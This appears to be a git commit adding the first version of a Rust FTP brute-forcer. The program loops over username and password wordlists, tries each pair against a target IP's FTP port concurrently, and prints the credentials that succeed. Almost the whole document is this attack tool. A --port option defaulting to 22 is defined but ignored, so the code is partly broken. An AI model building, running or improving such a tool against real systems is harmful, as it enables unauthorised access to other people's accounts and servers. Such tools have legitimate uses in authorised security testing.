82d8f895907c1fd8e3f2277c3a54afb877c5739a
tinthid <dev@tinthid.com>
2024-04-30 19:50:59 +0700

    start building a ftp bruteforcer

---
+++ ftp-bruteforcer/src/main.rs
@@ -0,0 +1,108 @@
+use clap::Parser;
+use std::sync::Arc;
+use std::{
+    fs,
+    net::{Ipv4Addr, SocketAddrV4},
+    path::{Path, PathBuf},
+};
+use tokio::task::JoinSet;
+use ftp::FtpStream;
+
+type Result<T> = std::result::Result<T, Error>;
+type Error = Box<dyn std::error::Error + Send + Sync>;
+
+#[derive(Parser, Debug)]
+struct Args {
+    #[arg(value_parser = clap::value_parser!(Ipv4Addr))]
+    target_ip: Ipv4Addr,
+    #[arg(
+        short = 'u',
+        long,
+        required_unless_present = "username-list",
+        conflicts_with = "username-list"
+    )]
+    username: Option<String>,
+    #[arg(
+        name = "username-list",
+        short = 'U',
+        long,
+        value_name = "USERNAME_LIST",
+        value_parser = clap::value_parser!(PathBuf)
+    )]
+    username_list: Option<PathBuf>,
+
+    #[arg(
+        short = 'p',
+        long,
+        required_unless_present = "password-list",
+        conflicts_with = "password-list"
+    )]
+    password: Option<String>,
+    #[arg(
+        name = "password-list",
+        short = 'P',
+        long,
+        value_name = "PASSWORD_LIST",
+        value_parser = clap::value_parser!(PathBuf)
+    )]
+    password_list: Option<PathBuf>,
+    #[arg(long, default_value_t = 22, value_parser = clap::value_parser!(u16))]
+    port: u16,
+}
+
+#[derive(Debug)]
+struct Credential {
+    username: Arc<String>,
+    password: Arc<String>,
+}
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    let args = Args::parse();
+    let socket = SocketAddrV4::new(args.target_ip, 21);
+
+    let usernames = match (args.username, args.username_list) {
+        (Some(u), None) => vec![Arc::new(u)],
+        (None, Some(wordlist)) => read_file(wordlist),
+        _ => unreachable!(),
+    };
+    let passwords = match (args.password, args.password_list) {
+        (Some(u), None) => vec![Arc::new(u)],
+        (None, Some(wordlist)) => read_file(wordlist),
+        _ => unreachable!(),
+    };
+
+    let mut tasks = JoinSet::new();
+    for username in usernames.iter() {
+        for password in passwords.iter() {
+            tasks.spawn(try_auth(
+                socket,
+                Credential {
+                    username: Arc::clone(username),
+                    password: Arc::clone(password),
+                },
+            ));
+        }
+    }
+    while let Some(result) = tasks.join_next().await {
+        match result? {
+            Ok(cred) => println!("{:?}", cred),
+            _ => (),
+        }
+    }
+    Ok(())
+}
+
+async fn try_auth(socket: SocketAddrV4, cred: Credential) -> Result<Credential> {
+    let mut ftp_stream = FtpStream::connect(socket.to_string())?;
+    let _ = ftp_stream.login(&cred.username, &cred.password)?;
+    Ok(cred)
+}
+
+fn read_file<P: AsRef<Path>>(path: P) -> Vec<Arc<String>> {
+    fs::read_to_string(path)
+        .unwrap()
+        .lines()
+        .map(|line| Arc::new(line.to_string()))
+        .collect()
+}
